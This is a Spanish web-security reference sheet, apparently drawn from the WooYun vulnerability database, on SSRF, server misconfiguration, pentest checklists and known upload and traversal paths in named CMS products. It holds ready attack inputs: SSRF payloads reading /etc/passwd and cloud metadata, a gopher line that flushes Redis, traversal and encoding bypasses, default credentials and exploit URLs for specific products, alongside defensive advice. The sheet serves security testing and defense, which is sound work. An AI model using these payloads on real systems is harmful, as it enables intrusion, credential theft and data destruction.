# Seguridad Web - SSRF, errores de configuración de servidor, Checklist integral

> Fuente: Base de datos de vulnerabilidades WooYun | Extraído de web-file-infra.md (SSRF + errores de configuración + Checklist + anexos de CMS/URL)

## IV. SSRF y explotación de protocolos

### 4.1 Naturaleza de la vulnerabilidad

```
Naturaleza del SSRF: el servidor realiza la petición en nombre del atacante, quien controla el destino de la petición
Riesgo: sondeo de red interna -> acceso a servicios internos -> lectura de archivos -> ejecución de comandos
```

### 4.2 Puntos de activación comunes

- Parámetro url en funciones de descarga de archivos
- Funciones de carga/proxy de imágenes
- Funciones de vista previa de páginas web/captura de pantalla
- Función de importación por URL
- Configuración de Webhook/callback

### 4.3 Explotación de protocolos

```bash
# file:// - Lectura de archivos arbitraria
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - Sondeo de puertos/interacción con servicios
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - Construcción de peticiones TCP arbitrarias
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - Sondeo de red interna
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # Metadatos de la nube
```

### 4.4 Técnicas de bypass

```bash
# Bypass mediante variantes de IP
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS rebinding: resolver a una IP externa y luego cambiar rápidamente a 127.0.0.1
# Enlaces cortos/redirección 302: saltar a una dirección interna a través de una URL externa
```

### 4.5 Medidas de defensa

1. Restricción por lista blanca: limitar el dominio/IP de destino de la petición
2. Restricción de protocolo: permitir solo http/https
3. Aislamiento de red interna: prohibir peticiones a direcciones RFC1918 y 127.0.0.1
4. Validación de resolución DNS: verificar de nuevo la pertenencia de la IP tras la resolución
5. Deshabilitar redirecciones: o limitar el número de redirecciones y volver a validar

---

## V. Errores de configuración del servidor

### 5.1 Errores de configuración de análisis (parsing)

| Problema | Riesgo | Método de verificación |
|-----|------|---------|
| Vulnerabilidad de parsing de IIS 6.0 sin corregir | `shell.asp;.jpg` se ejecuta | Probar con subida de archivo con punto y coma en el nombre |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php` se interpreta como PHP | Subir imagen y acceder a `/img.jpg/x.php` |
| Análisis de múltiples extensiones en Apache | `shell.php.xxx` se interpreta | Probar con subida de archivo de doble extensión |
| Scripts ejecutables en directorio de subida | Webshell se ejecuta directamente | Probar con subida de archivo de script |
| Listado de directorios habilitado | Expone todos los archivos | Acceder a la URL del directorio para verificar |

### 5.2 Errores de configuración de permisos

| Problema | Riesgo | Corrección |
|-----|------|------|
| Proceso Web ejecutándose con privilegios altos | Escalada de privilegios directa a root | Ejecutar con usuario de bajos privilegios |
| Directorio de subida con permisos 777 | Escritura y ejecución arbitrarias | Establecer 644/755 |
| Archivo de configuración legible | Filtración de credenciales | Sacarlo del directorio Web, restringir permisos |
| Panel de administración sin restricción de IP | Accesible desde internet | Lista blanca de IP/VPN |

### 5.3 Riesgos de configuración por defecto

```bash
# Rutas de panel de administración por defecto
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# Credenciales por defecto (alta frecuencia)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# Puertos de depuración por defecto
8080 (Tomcat) | 9090 (administración) | 3306 (MySQL expuesto a internet)
6379 (Redis sin contraseña) | 27017 (MongoDB sin autenticación)
```

### 5.4 Filtración de Spring Boot Actuator

```bash
/actuator/env          # Variables de entorno (incluye contraseñas)
/actuator/configprops  # Propiedades de configuración
/actuator/heapdump     # Volcado de memoria heap (incluye datos sensibles)
/actuator/mappings     # Todos los mapeos de URL
```

---

## VI. Checklist integral práctico

### 6.1 Pruebas de subida de archivos

- [ ] Escanear rutas comunes de editores (FCKeditor/eWebEditor/UEditor)
- [ ] Deshabilitar JavaScript para probar la validación del lado del cliente
- [ ] Probar bypass de extensión: mayúsculas/minúsculas/doble escritura/sufijos especiales/truncamiento %00/truncamiento con punto y coma
- [ ] Modificar el Content-Type a image/jpeg
- [ ] Agregar cabecera de archivo GIF89a / crear una imagen troyanizada
- [ ] Identificar el tipo de servidor y probar la vulnerabilidad de parsing correspondiente
- [ ] Probar el secuestro de parsing mediante subida de .htaccess/.user.ini
- [ ] Analizar las reglas de nomenclatura de archivos, probar fuerza bruta de rutas
- [ ] Probar subida mediante condición de carrera

### 6.2 Pruebas de traversal de archivos

- [ ] Identificar parámetros relacionados con archivos (filename/path/file/url/download)
- [ ] Traversal básico: `../../../../../etc/passwd`
- [ ] Prueba en Windows: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] Bypass mediante codificación URL: `%2e%2e%2f` / doble codificación `%252e%252e%252f`
- [ ] Bypass mediante Unicode: `%c0%ae%c0%ae/`
- [ ] Truncamiento con byte nulo: `../etc/passwd%00.jpg`
- [ ] Ruta absoluta: `/etc/passwd` / `file:///etc/passwd`

### 6.3 Escaneo de filtración de información

- [ ] Control de versiones: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] Archivos de respaldo: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] Respaldos de configuración: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] Archivos de entorno: `/.env` `/.env.production`
- [ ] Archivos de prueba: `/phpinfo.php` `/info.php` `/test.php`
- [ ] Archivos de registro (log): `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] Interfaces de administración: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Búsqueda asistida con sintaxis de Google Hacking

### 6.4 Pruebas de SSRF

- [ ] Identificar parámetros de URL/proxy/callback
- [ ] Probar lectura mediante protocolo file:///etc/passwd
- [ ] Probar direcciones de red interna: http://127.0.0.1:port
- [ ] Metadatos de la nube: http://169.254.169.254/latest/meta-data/
- [ ] Bypass mediante variantes de IP: hexadecimal/decimal/notación abreviada
- [ ] Bypass mediante DNS rebinding/redirección 302

---

## Anexo A: Referencia rápida de vulnerabilidades de CMS de alto riesgo

| CMS/Sistema | Tipo de vulnerabilidad | Ruta | Condición |
|---------|---------|------|------|
| Wanhu OA ezOffice | Subida arbitraria | `/defaultroot/dragpage/upload.jsp` | Truncamiento %00 |
| Plataforma colaborativa Yonyou | Subida arbitraria | `/oaerp/ui/sync/excelUpload.jsp` | Evasión de JS + fuerza bruta de nombre de archivo |
| Kingdee GSiS | Subida arbitraria | `/kdgs/core/upload/upload.jsp` | Usuario registrado |
| Jinzhi Education epstar | Traversal de archivos | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | Sin necesidad de autenticación |
| Zhiyuan OA | Filtración de logs | `/ctp.log` | Acceso directo |


## Anexo C: Patrones de URL de vulnerabilidades comunes

```bash
# Traversal de archivos en PHP
/down.php?filename=../../../etc/passwd
/pic.php?url=[ruta codificada en base64]

# Traversal de archivos en JSP
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# Traversal de archivos en ASP/ASPX
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# Específico de Resin
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **Cadena de suministro/despliegue en la nube/CVE de frameworks** → migrado a [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTP smuggling/WebSocket/OAuth** → migrado a [web-modern-protocols.md](web-modern-protocols.md)

*Elaborado a partir de la base de datos de vulnerabilidades WooYun (88,636 registros) | Solo para fines de investigación y defensa de seguridad*
